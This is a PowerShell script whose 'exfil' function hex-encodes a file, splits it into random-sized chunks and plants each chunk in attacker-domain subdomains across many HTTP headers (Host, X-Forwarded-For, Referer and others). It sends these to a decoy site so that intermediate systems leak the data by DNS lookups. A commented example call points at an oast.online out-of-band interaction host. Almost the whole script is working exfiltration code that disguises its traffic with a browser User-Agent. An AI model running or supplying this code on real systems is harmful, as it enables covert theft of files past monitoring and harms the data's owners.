function exfil {
    param (
        [string]$regex,
        [string]$domain,
        [string]$url,
        [string]$filepath
    )

	function Convert-FileToHexChunks {
		param(
			[Parameter(Mandatory=$true)]
			[string]$FilePath
		)

		try {
			# Get the name of the file
   			$fileName = Split-Path $filepath -Leaf
  		
			# Read the file as a byte array
			$bytes = [System.IO.File]::ReadAllBytes($FilePath)

			# Convert each byte to hexadecimal and join them into a string
			$hexString = ($bytes | ForEach-Object { "{0:X2}" -f $_ }) -join ''

			# Create an array to hold the chunks
			$chunks = @()
			$index = 0

			# Cut the hex string into random-sized chunks
			while ($index -lt $hexString.Length) {
				# Randomly determine the length of the next chunk (between 14 and 18)
				$chunkLength = Get-Random -Minimum 14 -Maximum 19
				$chunks += $hexString.Substring($index, [Math]::Min($chunkLength, $hexString.Length - $index))
				$index += $chunkLength
			}

			# Create a PSObject to store the chunks
			$hexObject = New-Object PSObject

			# Generate a random hex string of 8-16 characters for the first segment
			$hexFileName = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($fileName)).Replace('-', '')

			# Randomly select a separator for the total number of segments
			$totalSeparator = 'H'
			$hexObject | Add-Member -MemberType NoteProperty -Name 1 -Value ('j' + $chunks.Count.ToString() + $totalSeparator + $hexFileName + 'j')

			for ($i = 0; $i -lt $chunks.Count; $i++) {
				# Randomly select a separator from G, H, I for each chunk
				$separator = Get-Random -InputObject @('G', 'H', 'I')

				# Add each chunk as a property to the object
				# Prepend each chunk with its segment number and a random separator
				$segmentLabel = ($i + 1).ToString() + $separator
				$hexObject | Add-Member -MemberType NoteProperty -Name ($i + 2) -Value ($segmentLabel + $chunks[$i])
			}

			# Return the object
			return $hexObject
		}
		catch {
			Write-Error "An error occurred: $_"
		}
	}


	function Send-CustomRequest {
		param (
			[string]$Url,
			[string]$Domain
		)

		$headers = @{
			"Host" = "host.$Url.$Domain"
			"Accept" = "*/*"
			"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
			"Origin" = "https://$Url"
			"X-Forwarded-For" = "xff.$Url.$Domain"
			"X-Wap-Profile" = "http://wafp.$Url.$Domain/wap.xml"
			"CF-Connecting_IP" = "cfcon.$Url.$Domain"
			"Contact" = "root@contact.$Url.$Domain"
			"X-Real-IP" = "rip.$Url.$Domain"
			"True-Client-IP" = "trip.$Url.$Domain"
			"X-Client-IP" = "xclip.$Url.$Domain"
			"Forwarded" = "for=ff.$Url.$Domain"
			"X-Originating-IP" = "origip.$Url.$Domain"
			"Client-IP" = "clip.$Url.$Domain"
			"Referer" = "ref.$Url.$Domain"
			"From" = "root@from.$Url.$Domain"
		}

		try {
			$response = Invoke-WebRequest -Uri $Url -Headers $headers
			return $response
		} catch {
			Write-Error "Error: $_"
		}
	}

    $segments = Convert-FileToHexChunks -FilePath $filepath
    foreach ($segment in $segments.PSObject.Properties) {
        $secret = $segment.Value;
        send-customRequest -Url "$url" -Domain "$regex.$secret.$domain"   
		sleep 1		
    }
}

# exfil -regex 'xregex' -domain 'clndh3qilvdv6403g1n0hs3rhd6xpfmjn.oast.online' -url 'adobe.com' -filepath .\AST-Test.txt
